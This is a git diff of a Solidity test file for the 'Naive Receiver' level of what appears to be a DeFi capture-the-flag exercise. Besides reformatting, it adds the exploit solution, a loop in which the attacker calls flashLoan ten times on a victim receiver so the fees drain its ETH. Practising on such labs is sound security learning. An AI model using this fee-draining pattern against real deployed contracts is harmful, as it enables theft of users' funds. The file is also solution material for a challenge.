@@ -27,7 +27,10 @@ contract NaiveReceiver is Test {
         vm.label(attacker, "Attacker");
 
         naiveReceiverLenderPool = new NaiveReceiverLenderPool();
-        vm.label(address(naiveReceiverLenderPool), "Naive Receiver Lender Pool");
+        vm.label(
+            address(naiveReceiverLenderPool),
+            "Naive Receiver Lender Pool"
+        );
         vm.deal(address(naiveReceiverLenderPool), ETHER_IN_POOL);
 
         assertEq(address(naiveReceiverLenderPool).balance, ETHER_IN_POOL);
@@ -48,17 +51,33 @@ contract NaiveReceiver is Test {
         /**
          * EXPLOIT START *
          */
-
+        vm.startPrank(attacker);
+        for (uint256 i = 0; i < 10; i++) {
+            naiveReceiverLenderPool.flashLoan(
+                address(flashLoanReceiver),
+                1 ether
+            );
+            console.log(
+                unicode"balance of FlashLoanReceiver contract",
+                address(flashLoanReceiver).balance
+            );
+        }
+        vm.stopPrank();
         /**
          * EXPLOIT END *
          */
         validation();
-        console.log(unicode"\n🎉 Congratulations, you can go to the next level! 🎉");
+        console.log(
+            unicode"\n🎉 Congratulations, you can go to the next level! 🎉"
+        );
     }
 
     function validation() internal {
         // All ETH has been drained from the receiver
         assertEq(address(flashLoanReceiver).balance, 0);
-        assertEq(address(naiveReceiverLenderPool).balance, ETHER_IN_POOL + ETHER_IN_RECEIVER);
+        assertEq(
+            address(naiveReceiverLenderPool).balance,
+            ETHER_IN_POOL + ETHER_IN_RECEIVER
+        );
     }
 }
